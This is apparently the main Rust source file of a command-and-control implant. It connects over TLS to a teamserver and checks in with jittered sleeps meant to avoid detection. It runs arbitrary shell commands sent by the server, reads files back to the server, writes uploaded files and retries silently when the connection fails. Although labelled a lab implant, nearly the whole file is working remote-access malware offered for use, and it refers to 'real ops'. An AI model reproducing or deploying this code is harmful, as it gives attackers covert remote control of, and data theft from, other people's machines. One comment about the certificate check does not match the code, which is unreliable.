// phantom implant — light (neok1ra)
//
// keeps it simple:
//   1. connect to teamserver
//   2. send BeaconHello
//   3. loop: checkin → receive task → execute → send result
//   4. sleep with jitter
//
// no persistence, no UAC bypass, no evasion.
// this is a lab implant. use it in scope.
//
// compile: cargo build --release --target x86_64-unknown-linux-musl
// (static musl binary runs on basically any linux without dep issues)

use anyhow::Result;
use rand::Rng;
use serde::Serialize;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;

mod exec;
mod sysinfo;
mod config;

use config::Config;

#[tokio::main]
async fn main() -> Result<()> {
    let cfg = Config::from_env_or_defaults();

    // retry loop — if server is down, just sleep and retry
    loop {
        match run_beacon_loop(&cfg).await {
            Ok(_) => break,  // Die task received
            Err(_e) => {
                // don't print anything — real implant would just silently retry
                // in debug builds we can afford to log
                #[cfg(debug_assertions)]
                eprintln!("[phantom] connection error: {_e}, retrying in {}s", cfg.retry_secs);
                tokio::time::sleep(Duration::from_secs(cfg.retry_secs)).await;
            }
        }
    }
    Ok(())
}

async fn run_beacon_loop(cfg: &Config) -> Result<()> {
    let stream = TcpStream::connect(&cfg.server_addr).await?;
    let connector = build_tls_connector(cfg)?;
    let server_name = rustls::pki_types::ServerName::try_from(cfg.server_host.clone())?;
    let tls = connector
        .connect(server_name, stream)
        .await?;
    let mut io = BufReader::new(tls);

    // --- HANDSHAKE ---
    let hello = sysinfo::build_hello(cfg);
    let hello_json = format!("{}\n", serde_json::to_string(&hello)?);
    io.get_mut().write_all(hello_json.as_bytes()).await?;

    // receive session id
    let mut line = String::new();
    io.read_line(&mut line).await?;
    let handshake: serde_json::Value = serde_json::from_str(line.trim())?;
    let session_id = handshake["session_id"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("no session_id in handshake"))?
        .to_owned();

    #[cfg(debug_assertions)]
    eprintln!("[phantom] registered as {session_id}");

    // --- BEACON LOOP ---
    loop {
        // sleep with jitter before checking in
        // jitter prevents timing-based detection
        sleep_with_jitter(cfg.sleep_ms, cfg.jitter_pct).await;

        // send checkin
        let checkin = serde_json::json!({ "type": "checkin", "session_id": session_id });
        io.get_mut().write_all(format!("{checkin}\n").as_bytes()).await?;

        // receive task (or noop)
        line.clear();
        io.read_line(&mut line).await?;
        let task: serde_json::Value = serde_json::from_str(line.trim())?;
        let task_type = task["type"].as_str().unwrap_or("noop");

        #[cfg(debug_assertions)]
        eprintln!("[phantom] task: {task_type}");

        match task_type {
            "noop" => continue,

            "die" => {
                #[cfg(debug_assertions)]
                eprintln!("[phantom] received die, exiting");
                return Ok(());
            }

            "shell" => {
                let cmd = task["kind"]["cmd"].as_str().unwrap_or("echo empty");
                let task_id = task["id"].as_str().unwrap_or("unknown");
                let result = exec::shell(cmd).await;
                send_result(&mut io, task_id, &session_id, result).await?;
            }

            "ls" => {
                let path = task["kind"]["path"].as_str().unwrap_or(".");
                let task_id = task["id"].as_str().unwrap_or("unknown");
                let result = exec::ls(path);
                send_result(&mut io, task_id, &session_id, result).await?;
            }

            "sleep" => {
                // TODO: update local sleep config — need a mutable cfg or Arc<Mutex<>>
                // for now just ack it
                io.get_mut().write_all(b"{\"type\":\"ack\"}\n").await?;
            }

            "download" => {
                let path = task["kind"]["path"].as_str().unwrap_or("");
                let task_id = task["id"].as_str().unwrap_or("unknown");
                let result = exec::read_file(path);
                send_result(&mut io, task_id, &session_id, result).await?;
            }

            "upload" => {
                let path = task["kind"]["path"].as_str().unwrap_or("");
                let data = task["kind"]["data_b64"].as_str().unwrap_or("");
                let task_id = task["id"].as_str().unwrap_or("unknown");
                let result = exec::write_file(path, data);
                send_result(&mut io, task_id, &session_id, result).await?;
            }

            _other => {
                #[cfg(debug_assertions)]
                eprintln!("[phantom] unknown task type: {_other}");
            }
        }
    }
}

#[derive(Serialize)]
struct ResultPayload<'a> {
    #[serde(rename = "type")]
    msg_type:   &'static str,
    data: InnerResult<'a>,
}

#[derive(Serialize)]
struct InnerResult<'a> {
    task_id:    &'a str,
    session_id: &'a str,
    output:     String,
    exit_code:  Option<i32>,
    error:      Option<String>,
    completed_at: String,
}

async fn send_result(
    io:         &mut BufReader<impl tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin>,
    task_id:    &str,
    session_id: &str,
    result:     exec::ExecResult,
) -> Result<()> {
    let payload = ResultPayload {
        msg_type: "result",
        data: InnerResult {
            task_id,
            session_id,
            output:       result.output,
            exit_code:    result.exit_code,
            error:        result.error,
            completed_at: chrono::Utc::now().to_rfc3339(),
        },
    };
    let json = format!("{}\n", serde_json::to_string(&payload)?);
    io.get_mut().write_all(json.as_bytes()).await?;

    // wait for ack
    let mut line = String::new();
    io.read_line(&mut line).await?;
    Ok(())
}

async fn sleep_with_jitter(base_ms: u64, jitter_pct: u8) {
    let jitter = if jitter_pct > 0 {
        let range = base_ms * jitter_pct as u64 / 100;
        rand::thread_rng().gen_range(0..=range)
    } else {
        0
    };
    // randomly add or subtract — want genuine scatter, not always +jitter
    let sleep_ms = if rand::thread_rng().gen_bool(0.5) {
        base_ms.saturating_add(jitter)
    } else {
        base_ms.saturating_sub(jitter)
    };
    tokio::time::sleep(Duration::from_millis(sleep_ms)).await;
}

fn build_tls_connector(cfg: &Config) -> Result<TlsConnector> {
    use rustls::{ClientConfig, RootCertStore};

    // if a CA cert is provided, use it; otherwise accept any cert
    // (danger mode — fine for lab, not for real ops)
    let root_store = if let Some(ca_path) = &cfg.ca_cert {
        let mut store = RootCertStore::empty();
        let ca_file = std::fs::File::open(ca_path)?;
        let mut reader = std::io::BufReader::new(ca_file);
        for cert in rustls_pemfile::certs(&mut reader) {
            store.add(cert?)?;
        }
        store
    } else {
        // accept self-signed — lab only
        // TODO: replace with proper pinning for real ops
        RootCertStore::empty()
    };

    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    Ok(TlsConnector::from(std::sync::Arc::new(config)))
}
// beacon loop
// connection and beaconing handling
